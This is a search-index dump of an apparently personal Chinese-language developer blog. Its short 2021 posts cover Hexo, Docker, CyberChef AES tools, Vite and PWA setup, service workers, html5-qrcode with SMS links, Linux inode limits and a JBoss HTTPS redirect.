方法","uri":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/"},{"categories":["Hexo"],"content":"番外篇:Google Ads 發現新版，NEXT 主題做到無侵入式修改主題 我覺得還滿方便，可以來試試看。 後來看報這篇版更HEXO NEXT 6 → 8，以非侵入式修改整合AdSense、like coin、修正gitlab-ci文章更新時間錯誤的問題 | 只是個打字的介紹hsuanyi-chou/hexo-next-theme-integration: Hexo NexT主題 V8 懶人包 / Hexo NexT theme integrate google adSense \u0026 like coin button without intrusive modification template.，這個可以快速使用無侵入方式設定Google Adsense，但我已經套用原官方主題，所以把這個_data抓下來使用，再把下面設定上去就可以咯 設定參考版更HEXO NEXT 6 → 8，以非侵入式修改整合AdSense、like coin、修正gitlab-ci文章更新時間錯誤的問題 | 只是個打字的，建議去裡面看更完整內容 next/_config.yml # --------------------------------------------------------------- # Custom Settings # --------------------------------------------------------------- # Google AdSense google_adsense: enable: false google_ad_client_id: # \u003cclient id\u003e enable_page_level_ads: false ## sidebar_enable sidebar_enable: false sidebar_data_ad_slot: # \u003cslot id\u003e ## post header postheader_enable: false postheader_data_ad_slot: # \u003cslot id\u003e ## post footer postfooter_enable: false postfooter_data_ad_slot: # \u003cslot id\u003e 這個在設定啟用 custom_file_path: #head: source/_data/head.njk header: source/_data/header.njk sidebar: source/_data/sidebar.njk postMeta: source/_data/post-meta.njk postBodyEnd: source/_data/post-body-end.njk #footer: source/_data/footer.njk #bodyEnd: source/_data/body-end.njk #variable: source/_data/variables.styl #mixin: source/_data/mixins.styl style: source/_data/styles.styl 切記要把swig換成njk。 PS: 舊版設定 hexo NexT主題增加AdSense | 只是個打字的 NexT 使用文檔 還有不少錯誤，但至少可以跑… 先讓子彈飛一會兒 也許砍掉重練會比較快XD ","date":"2021-06-14","objectID":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/:4:0","tags":["hexo","next"],"title":"Hexo NexT 主題遇到連結 %20 空白問題，新版設定 Google Adsense 方法","uri":"/blog/posts/Hexo-NexT-%E4%B8%BB%E9%A1%8C%E9%81%87%E5%88%B0%E9%80%A3%E7%B5%90-20-%E7%A9%BA%E7%99%BD%E5%95%8F%E9%A1%8C%E6%96%B0%E7%89%88%E8%A8%AD%E5%AE%9A-Google-Adsense-%E6%96%B9%E6%B3%95/"},{"categories":["Hexo"],"content":"最近玩 Vite Nodejs 升級到 14 最近寫 Hexo 時候發現竟然部暑到 Github 都空白 我還以為我 Markdown 有問題 後來 rollback 回去上一版也是一樣 最後發現是 Github 部署檔案 html 為 0kb 瞬間傻了… 好險，我Git基本知識還行 退回先前版本回去 爬了很久我發現是 NodeJs 問題 參考: 解决hexo generate 生成的时候index.html为0kb空白的问题 | TonyStudio 但我發現我轉到 NodeJS 12 發現還是不能 hexo 生成的 html 文件为空的问题 · Alan Lee 不成功的话把public文件夹删了重新生成。 这个坑真是大。。。 沒想到這個真的能解決我問題，不知道為什麼 public 刪掉就正常 記得我同學推薦 n 比 nvm 好用 但發現 n 好像不能支援 windows 只好用 nvm(去官方抓release setup版本) Windows 10 安裝並使用 nvm 切換 NodeJS 版本 | Welcome.Web.World ","date":"2021-06-03","objectID":"/blog/posts/Hexo-%E5%8D%87%E7%B4%9A-nodejs-14-%E7%94%A2%E5%87%BA-0kb-%E6%AA%94%E6%A1%88%E5%95%8F%E9%A1%8C/:0:0","tags":["hexo"],"title":"Hexo 升級 nodejs 14 產出 0kb 檔案問題","uri":"/blog/posts/Hexo-%E5%8D%87%E7%B4%9A-nodejs-14-%E7%94%A2%E5%87%BA-0kb-%E6%AA%94%E6%A1%88%E5%95%8F%E9%A1%8C/"},{"categories":["Hexo"],"content":"嘗試升級到 4.2 最近玩 Vite ，我發現還滿有趣的 應該不會移除 一直切換 hexo 不是個好方法 所以我就嘗試看看升級 4.2 \"dependencies\": { \"hexo\": \"^4.2.0\", \"hexo-deployer-git\": \"^0.3.1\", \"hexo-generator-archive\": \"^0.1.4\", \"hexo-generator-category\": \"^0.1.3\", \"hexo-generator-index\": \"^0.2.0\", \"hexo-generator-searchdb\": \"^1.0.8\", \"hexo-generator-tag\": \"^0.2.0\", \"hexo-renderer-ejs\": \"^0.3.0\", \"hexo-renderer-marked\": \"^0.3.0\", \"hexo-renderer-stylus\": \"^0.3.1\", \"hexo-server\": \"^0.2.0\" } npm install 不想升到5版，好像有些設定檔案要調整 哪天迫不得以再說:| ","date":"2021-06-03","objectID":"/blog/posts/Hexo-%E5%8D%87%E7%B4%9A-nodejs-14-%E7%94%A2%E5%87%BA-0kb-%E6%AA%94%E6%A1%88%E5%95%8F%E9%A1%8C/:1:0","tags":["hexo"],"title":"Hexo 升級 nodejs 14 產出 0kb 檔案問題","uri":"/blog/posts/Hexo-%E5%8D%87%E7%B4%9A-nodejs-14-%E7%94%A2%E5%87%BA-0kb-%E6%AA%94%E6%A1%88%E5%95%8F%E9%A1%8C/"},{"categories":["Hexo"],"content":"其他 Hexo + github actions 自動化部署 | Winnie’s blog ","date":"2021-06-03","objectID":"/blog/posts/Hexo-%E5%8D%87%E7%B4%9A-nodejs-14-%E7%94%A2%E5%87%BA-0kb-%E6%AA%94%E6%A1%88%E5%95%8F%E9%A1%8C/:2:0","tags":["hexo"],"title":"Hexo 升級 nodejs 14 產出 0kb 檔案問題","uri":"/blog/posts/Hexo-%E5%8D%87%E7%B4%9A-nodejs-14-%E7%94%A2%E5%87%BA-0kb-%E6%AA%94%E6%A1%88%E5%95%8F%E9%A1%8C/"},{"categories":["Docker"],"content":"查看 docker compose 看 volume 方法 一直以為 docker-compose volume /inspect 但發現沒有這個功能 docker-compose inspect · Issue #4155 · docker/compose · GitHub How do you list volumes in docker containers? - Stack Overflow 看來用 portainer 會比較快 有更好的方法，會再補充 ","date":"2021-06-03","objectID":"/blog/posts/%E6%9F%A5%E7%9C%8B-docker-compose-%E7%9C%8B-volume-%E6%96%B9%E6%B3%95/:0:0","tags":["docker","volume"],"title":"查看 docker compose 看 volume 方法","uri":"/blog/posts/%E6%9F%A5%E7%9C%8B-docker-compose-%E7%9C%8B-volume-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"平常使用API都需要複雜AES加解密轉Base64 導致測試API都很麻煩 今天找到幾個好用的網站 整理一下 AES decryption AES encryption AES Hex Key Supported - The X Online Tools CTF在线工具-AES在线加解密|AES在线加密|AES在线解密|AES encryption|AES decryption 在线AES加密解密 - 拉米工具 CyberChef 這個可以客製化很多東西 AES加解密中文Base64就發現不能顯示出來 後來研究出方法 加密中文出來中文沒法加密無法解出中文，但英文不會有問題 暫時先用上面的網站來解決 Encode text, AES Encrypt, To Base64 - CyberChef https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-8%20(65001)')AES_Encrypt(%7B'option':'UTF8','string':'20F1aR41efffffff'%7D,%7B'option':'UTF8','string':'20F1aR41efffffff'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Base64('A-Za-z0-9%2B/%3D')\u0026input=YWJj5Lit5paHYWJj 解中文出來，後面加 decode text UTF-8 就正常了… From Base64, AES Decrypt, Decode text - CyberChef https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'20F1aR41efffffff'%7D,%7B'option':'UTF8','string':'20F1aR41efffffff'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Decode_text('UTF-8%20(65001)')\u0026input=QnEvc2xmcFAxSWR1YTFwUXNOV0hHUT09 ","date":"2021-06-02","objectID":"/blog/posts/%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/:0:0","tags":["aes"],"title":"線上解AES好用工具","uri":"/blog/posts/%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"翻外篇 CyberChef 強大好用的工具 ","date":"2021-06-02","objectID":"/blog/posts/%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/:1:0","tags":["aes"],"title":"線上解AES好用工具","uri":"/blog/posts/%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"抓取Email，去除重覆 Extract email addresses, Unique - CyberChef https://gchq.github.io/CyberChef/#recipe=Extract_email_addresses(false)Unique('Line%20feed')\u0026input=ZmZmZkBmZmYuY29tCmRkZGRAZmZmLmNvbSwgeHh4eEBmZmZmLmNvbQpmZmZmQGZmZi5jb20KZmZmZkBmZmYuY29t 維運很常需要做這些東西，我就不需要在 Sublime 抓出 Email 到 Excel 去除重覆 ","date":"2021-06-02","objectID":"/blog/posts/%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/:1:1","tags":["aes"],"title":"線上解AES好用工具","uri":"/blog/posts/%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["實用工具"],"content":"字串包 “,’ 符號 Extract IP addresses, 3 more - CyberChef https://gchq.github.io/CyberChef/#recipe=Extract_IP_addresses(true,false,false,false/disabled)Unique('Line%20feed')Find_/_Replace(%7B'option':'Regex','string':'(.%2B)'%7D,'%5C'$1%5C',',true,false,true,false)Sort('Line%20feed',false,'Alphabetical%20(case%20sensitive)') 常常有大量資料查詢，都靠Sublime Text去做，有時候大量資料會當機，但用這個也能做到一樣的效果，還能做去除、排序 ","date":"2021-06-02","objectID":"/blog/posts/%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/:1:2","tags":["aes"],"title":"線上解AES好用工具","uri":"/blog/posts/%E7%B7%9A%E4%B8%8A%E8%A7%A3AES%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["Vue"],"content":"我很久沒寫Vue 都忘記差不多 最近想寫一個小東西 有聽過一場Vite研討會 覺得很方便，就來使用看看 vite2: Make Web Dev Fast Again \u0026 Again. – Dropbox Paper 裡面dev proxy，還滿方便的 但不能做CROS 方法 這邊想成npm run dev 時候，進去 /api/ 時候會倒 proxy server 測試時候很方便 除了上面教學 這邊還滿多 Vite 文章 标签：vite - Fidel Yiu | 前端技术博客 Vite PWA 第六十章-Vite插件-vite-plugin-pwa - Fidel Yiu | 前端技术博客 但我後來源參照這篇 官方設定好像不是這樣(不知道是不是舊版的文) 設定非常簡單 import { defineConfig } from 'vite' import vue from '@vitejs/plugin-vue' import { VitePWA } from 'vite-plugin-pwa' // https://vitejs.dev/config/ export default defineConfig({ server: { proxy: { '/api': { target: 'http://localhost:8080/api', // changeOrigin: true, rewrite: path =\u003e path.replace(/^\\/api/, '') } } }, plugins: [vue(),VitePWA({ registerType: 'autoUpdate', manifest: { \"name\": \"XXXX\", \"short_name\": \"XXXX\", \"start_url\": \".\", \"display\": \"standalone\", \"background_color\": \"#fff\", \"description\": \"XXXX\", \"icons\": [ { \"src\": \"images/android-launchericon-48-48.png\", \"sizes\": \"48x48\", \"type\": \"image/png\" },{ \"src\": \"images/android-launchericon-72-72.png\", \"sizes\": \"72x72\", \"type\": \"image/png\" },{ \"src\": \"images/android-launchericon-144-144.png\", \"sizes\": \"144x144\", \"type\": \"image/png\" },{ \"src\": \"images/android-launchericon-192-192.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" },{ \"src\": \"images/android-launchericon-512-512.png\", \"sizes\": \"512x512\", \"type\": \"image/png\" }] }, workbox: { // workbox options for generateSW } })] }) ","date":"2021-06-02","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97/:0:0","tags":["vue","vite","cors"],"title":"使用 Vite 初體驗","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Vue"],"content":"Vite 使用環境變數 設定 Vite 環境變數需要注意幾個事情 .env 可以使用 Vite 環境變數 這邊提下小重點 .env # 所有情況下都會加載 .env.local # 所有情況下都會加載，但會被 git 忽略 .env.[mode] # 只在指定模式下加載 .env.[mode].local # 只在指定模式下加載，但會被 git 忽略 這邊.env.local會被 git 忽略，後來發現是 .local 都會被 git 忽略。 至於為什麼能被 git 忽略？因為建立 Vite 時候就已經被被在 .gitignore。我還以為 git 就有這個預設差點高潮 .env 環境變數需要用 VITE_開頭 DB_PASSWORD=foobar VITE_SOME_KEY=123 使用變數也是很簡單，用 import.meta.env.* 就可以抓出環境變數 仔細一看，這個一般 js 也能使用 环境变量和模式 | Vite 官方中文文档 import.meta - JavaScript | MDN vue-cli 遷移 vite2 實踐小結 - SegmentFault 思否 ","date":"2021-06-02","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97/:1:0","tags":["vue","vite","cors"],"title":"使用 Vite 初體驗","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Vue"],"content":"選擇環境變數編譯 vite build --mode staging 假如 vite 沒用在全域變數時候，可以用npm run build -- --mode test，這樣就不用在package.json做修改調整 參考: 如何向npm腳本發送命令行參數？ - 問答 - 雲+社區 - 騰訊雲 這邊假如有指定 mode 時候，我這邊有做實驗，環境套用順序是這樣 .env-\u003e.env.local-\u003e.env.test ","date":"2021-06-02","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97/:1:1","tags":["vue","vite","cors"],"title":"使用 Vite 初體驗","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Vue"],"content":"其他使用方式 【 Node.js 】利用 .env 與環境變數隱藏敏感資訊 vite.config.ts基础配置分享 - SKILL.NULL // Dotenv 是一个零依赖的模块，它能将环境变量中的变量从 .env 文件加载到 process.env 中 const dotenv = require(\"dotenv\") const envFiles = [ /** default file */ `.env`, /** mode file */ `.env.${process.env.NODE_ENV}` ] for (const file of envFiles) { const envConfig = dotenv.parse(fs.readFileSync(file)) for (const k in envConfig) { process.env[k] = envConfig[k] } } ","date":"2021-06-02","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97/:1:2","tags":["vue","vite","cors"],"title":"使用 Vite 初體驗","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["實用工具"],"content":"最近簡單做一個PWA 但是一次要產生各種大小的圖 我覺得好麻煩 這邊找到幾個網路上找到得資源 Android 可用 PWABuilder 這邊決 IOS IOS 可用 App Icon Generator 我邊是用 180px 其他 Android Asset Studio - Launcher icon generator 參考來源: mobile safari - PWA icons are not used in iOS 11.3 - Stack Overflow ","date":"2021-06-02","objectID":"/blog/posts/ICON-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%B0%8F%E8%A8%98/:0:0","tags":["icon","android","ios"],"title":"ICON 快速產生小記","uri":"/blog/posts/ICON-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E5%B0%8F%E8%A8%98/"},{"categories":["Docker"],"content":"比較常在網路上看到 volumes: - \"/etc/localtime:/etc/localtime:ro\" 但測試 Java Container發現沒有成功 後來使用下面方法就成功了 environment: - \"TZ=Asia/Taipei\" 參考: 設定 Docker Container 與 Host 相同時區的方法 [筆記] 修改 docker 容器內的時區 - Change Timezone in Docker | MC部落 ","date":"2021-06-02","objectID":"/blog/posts/Docker-%E4%BF%AE%E6%94%B9%E6%99%82%E5%8D%80%E6%96%B9%E6%B3%95/:0:0","tags":["docker"],"title":"Docker 修改時區方法","uri":"/blog/posts/Docker-%E4%BF%AE%E6%94%B9%E6%99%82%E5%8D%80%E6%96%B9%E6%B3%95/"},{"categories":["HTML5"],"content":"最近寫個小APP 想說沒網路也能用 沒想到也是一個大學問 ","date":"2021-06-02","objectID":"/blog/posts/html5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95/:0:0","tags":["html5"],"title":"html5 離線網頁方法","uri":"/blog/posts/html5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95/"},{"categories":["HTML5"],"content":"舊的使用方法(以廢棄) 建議不用使用Using the application cache - HTML: HyperText Markup Language | MDN 以廢棄 使用參考 [HTML5試試看-25] 離線程式 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 有趣的HTML5：离线存储 - SegmentFault 思否 ","date":"2021-06-02","objectID":"/blog/posts/html5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95/:1:0","tags":["html5"],"title":"html5 離線網頁方法","uri":"/blog/posts/html5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95/"},{"categories":["HTML5"],"content":"sw service worker 实现离线缓存 PWA-3小时带你实现渐进式WebAPP_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili 使用Service worker實現加速/離線訪問靜態blog網站_谷歌開發者 - 微文庫 ","date":"2021-06-02","objectID":"/blog/posts/html5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95/:2:0","tags":["html5"],"title":"html5 離線網頁方法","uri":"/blog/posts/html5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95/"},{"categories":["HTML5"],"content":"實作 https://developers.google.com/web/fundamentals/codelabs/offline?hl=zh-tw 參照裡面做法 index.html \u003cscript\u003e if('serviceWorker' in navigator) { navigator.serviceWorker .register('/sw.js') .then(function() { console.log(\"Service Worker Registered\"); }); } \u003c/script\u003e sw.js self.addEventListener('install', function(e) { console.log('[Service Worker] Install'); }); var cacheName = 'js13kPWA-v2'; var appShellFiles = [ '/', 'index.html', 'https://cdnjs.cloudflare.com/ajax/libs/html5-qrcode/2.0.1/html5-qrcode.min.js' ]; var contentToCache = appShellFiles; self.addEventListener('install', function(e) { console.log('[Service Worker] Install'); e.waitUntil( caches.open(cacheName).then(function(cache) { console.log('[Service Worker] Caching all: app shell and content'); return cache.addAll(contentToCache); }) ); }); self.addEventListener('activate', event =\u003e { event.waitUntil(self.clients.claim()); }); self.addEventListener('fetch', event =\u003e { event.respondWith( caches.open(cacheName) .then(cache =\u003e cache.match(event.request, {ignoreSearch: true})) .then(response =\u003e { return response || fetch(event.request); }) ); }); 就順利成功 有空再深入研究 ","date":"2021-06-02","objectID":"/blog/posts/html5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95/:2:1","tags":["html5"],"title":"html5 離線網頁方法","uri":"/blog/posts/html5-%E9%9B%A2%E7%B7%9A%E7%B6%B2%E9%A0%81%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"最近疾管家 QRCOD掃描功能出來 公司叫我查看怎麼做出這個案例 簡單看了一下 1922 簡訊實聯制 - HackMD 竟然是 html5-qrcode 想看他的原始碼，竟然找不到 後來看原始碼，有看到map設定 突然想到這個好像能看原始碼 保哥 - 前端工程師不可不知的 Source Maps 應用技巧 ","date":"2021-06-02","objectID":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/:0:0","tags":["html5","javascript","qrcode"],"title":"html5-qrcode 簡單研究","uri":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/"},{"categories":["JavaScript"],"content":"html5-qrcode 簡單探討 取得相機功能 預防以後API會變 這邊主要連結到官方文件 另外，需要https協定才能開攝像頭 假如你有架設traefik+docker 可以用以下指令快速建制 docker run -d --rm --name my-apache-app -v \"$PWD\":/usr/local/apache2/htdocs/ -l \"traefik.http.routers.testweb.rule=Host(\\`testweb.xxxx.duckdns.org\\`)\" -l \"traefik.http.routers.testweb.tls=true\" --net traefik_network httpd:2.4 抓取設備 GitHub - mebjas/html5-qrcode: A cross platform HTML5 QR code reader device id 最後一個，為後鏡頭 後來發現，不需要這樣抓後鏡頭 設定後鏡頭 // If you want to prefer back camera html5QrCode.start({ facingMode: \"environment\" }, config, qrCodeSuccessCallback); GitHub - mebjas/html5-qrcode: A cross platform HTML5 QR code reader 開始掃qrcode const html5QrCode = new Html5Qrcode(/* element id */ \"reader\"); html5QrCode.start( cameraId, { fps: 10, // Optional frame per seconds for qr code scanning qrbox: 250 // Optional if you want bounded box UI }, qrCodeMessage =\u003e { // do something when code is read }, errorMessage =\u003e { // parse error, ignore it. }) .catch(err =\u003e { // Start failed, handle it. }); 暫停掃 qrcode GitHub - mebjas/html5-qrcode: A cross platform HTML5 QR code reader html5QrCode.stop().then(ignore =\u003e { // QR Code scanning is stopped. }).catch(err =\u003e { // Stop failed, handle it. }); 地雷(記得掃到馬上停掉) 記得掃到馬上停掉!! 記得掃到馬上停掉!! 記得掃到馬上停掉!! 因為掃到，持續會callback 開簡訊 會悲劇…. 掃到，stopcamera 就比較不會出問題 ","date":"2021-06-02","objectID":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/:0:1","tags":["html5","javascript","qrcode"],"title":"html5-qrcode 簡單研究","uri":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/"},{"categories":["JavaScript"],"content":"js 轉簡訊 這邊有個大地雷 qrcode 轉 sms 程式 Android 竟然不能轉 但是IOS可以 這邊就是使用 if (isAndroid()) { location.href = \"sms:1922?body=00000000\" } else { // iOS location.href = \"sms:1922\u0026body=00000000\" } Android用超連結就可順利執行 為什麼liff Android 可以直接轉的?目前猜測是line app可以這樣做 把疾管家用到 Chrome 就不能使用 這邊就不深入了 網路範例 bradorego.com/test/sms.html \u003cp\u003e \u003ca href=\"sms:5552345678\"\u003ePhone only\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms:+15552345678\"\u003ePhone(+1) only\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms:?body=Hello,%20world\"\u003eBody only\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms:;body=Hello,%20world\"\u003e;body only\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms:5552345678?body=Hello%20World\"\u003ePhone and ?body\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms:+15552345678?body=Hello%20World\"\u003ePhone(+1) and ?body\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms:5552345678;body=Hello%20World\"\u003ePhone(+1) and ;body\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms://5552345678\"\u003ePhone only (sms://)\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms://+15552345678\"\u003ePhone(+1) only (sms://)\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms://5552345678?body=Hello,%20World\"\u003ePhone and ?body (sms://)\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms://+15552345678?body=Hello,%20World\"\u003ePhone(+1) and ?body (sms://)\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms://5552345678;body=Hello,%20World\"\u003ePhone and ;body (sms://)\u003c/a\u003e \u003c/p\u003e \u003cp\u003e \u003ca href=\"sms://+15552345678;body=Hello,%20World\"\u003ePhone(+1) and ;body (sms://)\u003c/a\u003e \u003c/p\u003e ","date":"2021-06-02","objectID":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/:0:2","tags":["html5","javascript","qrcode"],"title":"html5-qrcode 簡單研究","uri":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/"},{"categories":["JavaScript"],"content":"SMSTO 這邊有個地雷，SMSTO 小米手機不能轉 可以用Google 智慧鏡頭 解決 QRCODE 正常手機掃條碼就能自動轉 ","date":"2021-06-02","objectID":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/:0:3","tags":["html5","javascript","qrcode"],"title":"html5-qrcode 簡單研究","uri":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/"},{"categories":["JavaScript"],"content":"彩蛋 vite2: Make Web Dev Fast Again \u0026 Again. – Dropbox Paper [ES6,7,8,9,10,11中，用一次就上GitHub - kurotanshi/hex-vite-demo: 2021 大神來六角 demo code癮的語法 – Dropbox Paper](https://paper.dropbox.com/doc/ES67891011-oUCvWdcmTSKsiuGzbTjZC) ","date":"2021-06-02","objectID":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/:1:0","tags":["html5","javascript","qrcode"],"title":"html5-qrcode 簡單研究","uri":"/blog/posts/html5-qrcode-%E7%B0%A1%E5%96%AE%E7%A0%94%E7%A9%B6/"},{"categories":["Linux"],"content":"inode 有限制檔案數量 刪除沒用到的檔案 2021-06-14 後來有找到 XFS 會造成空間已滿問題 XFS 程式出現 no space left on device | 程式狂想筆記 大家可以確認看看 檔案數量限制 · Linux學習筆記 #python2 for x in xrange(0,1000000000): f=open(str(x),'a') f.close() 64000 看起來是指子資料夾限制 It depends on the file system. ext3 suppport ~32000 subdirectories (not files!) in a given directory, with ext4 it’s 64000 by default. xfs has no limit to my knowledge. linux - Is there a hard limit to the number of files a directory can have? - Server Fault Linux实例磁盘空间满和inode满的问题排查方法 - 阿里云 【程式】Shell Script : 顯示某資料匣下的 inode 數量 (檔案數) @ My Life :: 隨意窩 Xuite日誌 Linux 快速清除「檔案數量太多」的速度比較 – Tsung’s Blog inode 用光光了 | 老洪的 IT 學習系統 [問題] XFS檔案系統，刪除檔案沒有釋放空間。 - 看板Linux | PTT數位生活區 https://www.cnblogs.com/diantong/p/10512696.html Linux下使用xfs時提示沒有磁盤空間的情況該如何處理_Linux維護 lostwa.com - 一次 XFS 文件系统碎片导致的空间异常 Linux磁盘空间怎么释放？ - 知乎 ","date":"2021-06-02","objectID":"/blog/posts/%E7%B3%BB%E7%B5%B1%E4%B8%8A%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F%E9%99%90%E5%88%B6/:0:0","tags":["linux"],"title":"系統上檔案數量限制","uri":"/blog/posts/%E7%B3%BB%E7%B5%B1%E4%B8%8A%E6%AA%94%E6%A1%88%E6%95%B8%E9%87%8F%E9%99%90%E5%88%B6/"},{"categories":["JBoss"],"content":"redirect https://stackoverflow.com/a/43948374 我有測試上面網站方式，本機測試可以http導向https 我這邊standalone.xml 剛好預設有那些https設定，所以沒調整 project /WebContent/WEB-INF/web.xml 也需要加 \u003csecurity-constraint\u003e \u003cweb-resource-collection\u003e \u003cweb-resource-name\u003eWEB_APPLICATION_NAME\u003c/web-resource-name\u003e \u003curl-pattern\u003e/*\u003c/url-pattern\u003e \u003c/web-resource-collection\u003e \u003cuser-data-constraint\u003e \u003ctransport-guarantee\u003eCONFIDENTIAL\u003c/transport-guarantee\u003e \u003c/user-data-constraint\u003e \u003c/security-constraint\u003e 參考:https://www.cnblogs.com/maximo/p/5775627.html ","date":"2021-06-02","objectID":"/blog/posts/Jboss-%E8%A8%AD%E5%AE%9A-http-%E5%B0%8E-https/:1:0","tags":["jboss","http","https"],"title":"Jboss 設定 http 導 https","uri":"/blog/posts/Jboss-%E8%A8%AD%E5%AE%9A-http-%E5%B0%8E-https/"},{"categories":["JBoss"],"content":"rewrite standalone.xml \u003csubsystem xmlns=\"urn:jboss:domain:transactions:4.0\"\u003e \u003ccore-environment\u003e \u003cprocess-id\u003e \u003cuuid/\u003e \u003c/process-id\u003e \u003c/core-environment\u003e \u003crecovery-environment socket-binding=\"txn-recovery-environment\" status-socket-binding=\"txn-status-manager\"/\u003e \u003cobject-store path=\"tx-object-store\" relative-to=\"jboss.server.data.dir\"/\u003e \u003c/subsystem\u003e \u003csubsystem xmlns=\"urn:jboss:domain:undertow:4.0\"\u003e \u003cbuffer-cache name=\"default\"/\u003e \u003cserver name=\"default-server\"\u003e \u003chttp-listener name=\"default\" socket-binding=\"http\" redirect-socket=\"https\" enable-http2=\"true\"/\u003e \u003chttps-listener name=\"https\" socket-binding=\"https\" security-realm=\"ApplicationRealm\" enable-http2=\"true\"/\u003e \u003chost name=\"default-host\" alias=\"localhost\"\u003e \u003clocation name=\"/\" handler=\"welcome-content\"/\u003e \u003cfilter-ref name=\"server-header\"/\u003e \u003cfilter-ref name=\"x-powered-by-header\"/\u003e \u003chttp-invoker security-realm=\"ApplicationRealm\"/\u003e \u003cfilter-ref name=\"http-to-https\" predicate=\"equals(%p,8080)\"/\u003e \u003c/host\u003e \u003c/server\u003e \u003cservlet-container name=\"default\"\u003e \u003cjsp-config 